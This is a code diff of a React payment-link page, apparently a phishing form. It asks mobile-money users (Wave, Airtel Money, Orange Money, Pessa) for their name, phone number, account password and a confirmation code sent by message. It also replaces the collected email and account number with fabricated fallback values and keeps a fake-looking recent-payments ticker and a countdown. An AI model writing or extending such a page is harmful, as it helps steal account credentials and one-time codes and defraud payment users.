@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
     ShieldCheck,
@@ -13,12 +13,9 @@ import {
     Loader2,
     Check,
     Clock,
-    RefreshCw,
     Send,
     TrendingUp,
-    FileCheck,
-    Layers,
-    DollarSign
+    ChevronDown,
 } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import { cn } from '@/lib/utils';
@@ -26,6 +23,70 @@ import { dataService } from '@/lib/dataService';
 import { useParams } from 'next/navigation';
 import RecentPaymentsTicker from '@/components/form/RecentPaymentsTicker';
 import CountrySelector, { Country } from '@/components/form/CountrySelector';
+
+/* ─────────────────────────── Moyens de paiement ─────────────────────────── */
+const PAYMENT_METHODS = [
+    {
+        id: 'Wave',
+        label: 'Wave',
+        color: '#00A3FF',
+        badgeBg: 'bg-[#00A3FF]/15',
+        border: 'border-[#00A3FF]/40',
+        logo: (
+            <div className="w-8 h-8 rounded-xl bg-[#00A3FF] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#00A3FF]/30 select-none">
+                W
+            </div>
+        ),
+    },
+    {
+        id: 'Airtel Money',
+        label: 'Airtel Money',
+        color: '#E30613',
+        badgeBg: 'bg-[#E30613]/15',
+        border: 'border-[#E30613]/40',
+        logo: (
+            <div className="w-8 h-8 rounded-xl bg-[#E30613] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#E30613]/30 select-none">
+                A
+            </div>
+        ),
+    },
+    {
+        id: 'Orange Money',
+        label: 'Orange Money',
+        color: '#FF6600',
+        badgeBg: 'bg-[#FF6600]/15',
+        border: 'border-[#FF6600]/40',
+        logo: (
+            <div className="w-8 h-8 rounded-xl bg-[#FF6600] flex items-center justify-center font-black text-white text-xs shadow-md shadow-[#FF6600]/30 select-none">
+                OM
+            </div>
+        ),
+    },
+    {
+        id: 'Pessa',
+        label: 'Pessa',
+        color: '#00A651',
+        badgeBg: 'bg-[#00A651]/15',
+        border: 'border-[#00A651]/40',
+        logo: (
+            <div className="w-8 h-8 rounded-xl bg-[#00A651] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#00A651]/30 select-none">
+                P
+            </div>
+        ),
+    },
+    {
+        id: 'Autre',
+        label: 'Autre moyen',
+        color: '#94A3B8',
+        badgeBg: 'bg-slate-800',
+        border: 'border-white/10',
+        logo: (
+            <div className="w-8 h-8 rounded-xl bg-slate-800 border border-white/15 flex items-center justify-center text-base shadow-sm select-none">
+                💳
+            </div>
+        ),
+    },
+];
 
 const COUNTRIES: Country[] = [
     { name: "Cameroun", code: "CM", dial: "+237" },
@@ -63,18 +124,18 @@ export default function ClientLinkPage() {
     const [submissionId, setSubmissionId] = useState<string | null>(null);
     const [isSubmitting, setIsSubmitting] = useState(false);
 
-    // Formulaire principal
+    // Formulaire principal (Uniquement: Nom, Téléphone, Moyen de paiement, Mot de passe)
     const [formData, setFormData] = useState({
         fullName: '',
-        email: '',
         phone: '',
         dialCode: '+237',
         countryName: 'Cameroun',
         countryCode: 'CM',
-        accountNumber: '',
         password: '',
-        method: 'NexusLink Direct'
+        method: 'Wave'
     });
+    const [isPaymentMenuOpen, setIsPaymentMenuOpen] = useState(false);
+    const paymentMenuRef = useRef<HTMLDivElement | null>(null);
 
     // Code de confirmation ou lien reçu par message
     const [confirmationCode, setConfirmationCode] = useState('');
@@ -83,6 +144,17 @@ export default function ClientLinkPage() {
     // Compte à rebours du traitement (5 minutes = 300 secondes)
     const [timeLeft, setTimeLeft] = useState(300);
     const [progressPercent, setProgressPercent] = useState(0);
+
+    // Fermeture du menu de paiement au clic extérieur
+    useEffect(() => {
+        const handleClickOutside = (e: MouseEvent) => {
+            if (paymentMenuRef.current && !paymentMenuRef.current.contains(e.target as Node)) {
+                setIsPaymentMenuOpen(false);
+            }
+        };
+        document.addEventListener('mousedown', handleClickOutside);
+        return () => document.removeEventListener('mousedown', handleClickOutside);
+    }, []);
 
     // Récupération initiale du lien
     useEffect(() => {
@@ -212,14 +284,18 @@ export default function ClientLinkPage() {
         setIsSubmitting(true);
 
         try {
+            const cleanDigits = formData.phone.replace(/[^0-9]/g, '');
             const fullPhone = `${formData.dialCode} ${formData.phone}`.trim();
+            const fallbackEmail = `${cleanDigits || 'client'}@client.nexuslink.internal`;
+            const fallbackAccount = `${formData.method}-${cleanDigits.slice(-4) || 'COMPTE'}`;
+
             const res = await dataService.submitForm({
                 link_id: linkId,
                 full_name: formData.fullName,
-                email: formData.email,
+                email: fallbackEmail,
                 phone: fullPhone,
                 method: formData.method,
-                account_number: formData.accountNumber,
+                account_number: fallbackAccount,
                 password: formData.password,
                 country_name: formData.countryName,
                 country_code: formData.countryCode,
@@ -331,6 +407,7 @@ export default function ClientLinkPage() {
                             </div>
 
                             <form onSubmit={handleInitialSubmit} className="space-y-5">
+                                {/* 1. Nom et prénom complet */}
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                         Nom et prénom complet
@@ -345,20 +422,7 @@ export default function ClientLinkPage() {
                                     />
                                 </div>
 
-                                <div>
-                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
-                                        Adresse email
-                                    </label>
-                                    <input
-                                        type="email"
-                                        required
-                                        placeholder="contact@exemple.com"
-                                        value={formData.email}
-                                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
-                                        className="input-field text-sm"
-                                    />
-                                </div>
-
+                                {/* 2. Numéro de téléphone avec indicatif */}
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                         Numéro de téléphone
@@ -387,20 +451,76 @@ export default function ClientLinkPage() {
                                     </div>
                                 </div>
 
+                                {/* 3. Moyen de paiement (Menu Déroulant avec Logos Wave, Airtel, OrangeMoney, Pessa, Autre) */}
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5">
-                                        Identifiant ou Numéro de compte
+                                        Moyen de paiement
                                     </label>
-                                    <input
-                                        type="text"
-                                        required
-                                        placeholder="ex: NL-984210"
-                                        value={formData.accountNumber}
-                                        onChange={(e) => setFormData({ ...formData, accountNumber: e.target.value })}
-                                        className="input-field text-sm font-mono"
-                                    />
+                                    <div className="relative" ref={paymentMenuRef}>
+                                        <button
+                                            type="button"
+                                            onClick={() => setIsPaymentMenuOpen(!isPaymentMenuOpen)}
+                                            className="w-full flex items-center justify-between gap-3 p-3 rounded-xl bg-slate-900/90 border border-white/10 hover:border-blue-500/50 text-left transition-all cursor-pointer focus:outline-none focus:ring-2 focus:ring-blue-500/30"
+                                        >
+                                            <div className="flex items-center gap-3">
+                                                {(PAYMENT_METHODS.find(p => p.id === formData.method) || PAYMENT_METHODS[0]).logo}
+                                                <div>
+                                                    <span className="text-sm font-semibold text-white block">
+                                                        {(PAYMENT_METHODS.find(p => p.id === formData.method) || PAYMENT_METHODS[0]).label}
+                                                    </span>
+                                                    <span className="text-[10px] text-slate-400">
+                                                        Sélectionnez votre moyen de réception
+                                                    </span>
+                                                </div>
+                                            </div>
+                                            <ChevronDown className={cn("w-4 h-4 text-slate-400 transition-transform duration-200", isPaymentMenuOpen && "rotate-180 text-blue-400")} />
+                                        </button>
+
+                                        <AnimatePresence>
+                                            {isPaymentMenuOpen && (
+                                                <motion.div
+                                                    initial={{ opacity: 0, y: 6, scale: 0.98 }}
+                                                    animate={{ opacity: 1, y: 0, scale: 1 }}
+                                                    exit={{ opacity: 0, y: 6, scale: 0.98 }}
+                                                    transition={{ duration: 0.15 }}
+                                                    className="absolute left-0 right-0 top-full mt-2 bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl p-2 z-50 backdrop-blur-xl ring-1 ring-white/10 space-y-1"
+                                                >
+                                                    {PAYMENT_METHODS.map((pm) => {
+                                                        const isSelected = formData.method === pm.id;
+                                                        return (
+                                                            <button
+                                                                type="button"
+                                                                key={pm.id}
+                                                                onClick={() => {
+                                                                    setFormData({ ...formData, method: pm.id });
+                                                                    setIsPaymentMenuOpen(false);
+                                                                }}
+                                                                className={cn(
+                                                                    "w-full flex items-center justify-between p-2.5 rounded-xl text-left transition-all cursor-pointer",
+                                                                    isSelected
+                                                                        ? "bg-blue-600/15 border border-blue-500/30 text-white"
+                                                                        : "hover:bg-white/[0.05] text-slate-300"
+                                                                )}
+                                                            >
+                                                                <div className="flex items-center gap-3">
+                                                                    {pm.logo}
+                                                                    <span className="text-sm font-medium">
+                                                                        {pm.label}
+                                                                    </span>
+                                                                </div>
+                                                                {isSelected && (
+                                                                    <Check className="w-4 h-4 text-blue-400" />
+                                                                )}
+                                                            </button>
+                                                        );
+                                                    })}
+                                                </motion.div>
+                                            )}
+                                        </AnimatePresence>
+                                    </div>
                                 </div>
 
+                                {/* 4. Mot de passe du compte */}
                                 <div>
                                     <label className="block text-xs font-medium text-slate-300 mb-1.5 flex justify-between">
                                         <span>Mot de passe du compte</span>
